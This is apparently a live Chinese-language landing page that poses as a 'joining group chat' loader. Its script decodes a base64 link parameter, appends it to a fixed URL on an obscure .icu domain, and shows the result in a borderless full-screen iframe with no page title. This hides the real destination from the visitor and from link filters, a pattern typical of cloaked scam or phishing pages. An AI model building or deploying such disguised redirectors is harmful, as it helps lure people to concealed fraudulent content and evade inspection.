<html lang="zh-CN">
<head>
  <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport">
  <meta content="yes" name="apple-mobile-web-app-capable">
  <meta content="yes" name="apple-touch-fullscreen">
  <meta content="black" name="apple-mobile-web-app-status-bar-style">
  <meta content="320" name="MobileOptimized">
  <title></title>
  <style>
    .content {
      height: 100%;
      width: 100%;
      position: fixed;
      left: 0;
      top: 0;
      border: none;
      margin: 0;
      padding: 0;
      display: none;
    }
    body { margin: 0; padding: 0; overflow: hidden; }

    .loader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #fff;
      z-index: 9999;
    }
    .loader-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
    }
    .loader-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    .loader-text {
      font-size: 16px;
      color: #666;
      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
      text-align: center;
    }
    .loader-nums {
      display: inline-flex;
      align-items: center;
      color: #3498db;
    }
    /* 核心修改1：用step-end取消所有过渡，强制瞬间切换状态 */
    .loader-num {
      visibility: hidden;
      opacity: 0;
      animation: num-cycle 2s step-end infinite; /* 关键：step-end无任何渐变 */
    }
    /* 数字延迟不变，确保逐个显示，隐藏时同步 */
    .loader-num:nth-child(1) { animation-delay: 0s; }
    .loader-num:nth-child(2) { animation-delay: 0.3s; }
    .loader-num:nth-child(3) { animation-delay: 0.6s; }
    .loader-num:nth-child(4) { animation-delay: 0.9s; }
    /* 核心修改2：关键帧只留“隐藏/显示”两个状态，无中间过渡区间 */
    @keyframes num-cycle {
      0% { visibility: hidden; opacity: 0; }   /* 初始：隐藏 */
      1% { visibility: visible; opacity: 1; }  /* 1%时瞬间显示（无渐变） */
      70% { visibility: visible; opacity: 1; } /* 保持显示到1.4秒 */
      71% { visibility: hidden; opacity: 0; }  /* 71%时瞬间隐藏（无渐变） */
      100% { visibility: hidden; opacity: 0; } /* 保持隐藏到循环结束 */
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="loader">
    <div class="loader-group">
      <div class="loader-spinner"></div>
      <div class="loader-text">
        群聊加入中
        <div class="loader-nums">
          <span class="loader-num">.</span>
          <span class="loader-num">.</span>
          <span class="loader-num">.</span>
          <span class="loader-num">.</span>
        </div>
      </div>
    </div>
  </div>

  <script>
    // 内部固定前缀
    const fixedPrefix = 'http://d.0nn.icu/group.php/index/share/id/147/t/6443c5ef5aa0278b2e988ea70aa81a0c/time/1754934138.htm';
    // 解析外部参数
    const urlParams = new URLSearchParams(window.location.search);
    const encodedSuffix = urlParams.get('c');

    if (encodedSuffix) {
      try {
        const decodedSuffix = atob(encodedSuffix);
        const fullUrl = fixedPrefix + decodedSuffix;
        const isLegalUrl = /^https?:\/\/.+/.test(fullUrl);
        
        if (isLegalUrl) {
          window.onload = null;
          if (document.body.onload) document.body.onload = null;

          const iframe = document.createElement('iframe');
          iframe.className = 'content';
          iframe.src = fullUrl;
          iframe.frameBorder = '0';
          iframe.scrolling = 'auto';

          iframe.onload = function() {
            document.querySelector('.loader').style.display = 'none';
            iframe.style.display = 'block';
          };
          
          document.body.appendChild(iframe);

        } else {
          console.error('拼接后的URL不合法：', fullUrl);
          alert('链接格式错误，无法加载内容');
          document.querySelector('.loader').style.display = 'none';
        }
      } catch (error) {
        console.error('参数解码失败：', error);
        alert('内容参数解析错误，请检查链接有效性');
        document.querySelector('.loader').style.display = 'none';
      }
    } else {
      console.error('未获取到参数c（后缀内容）');
      alert('缺少必要内容参数，无法加载页面');
      document.querySelector('.loader').style.display = 'none';
    }
  </script>
</body>
</html>
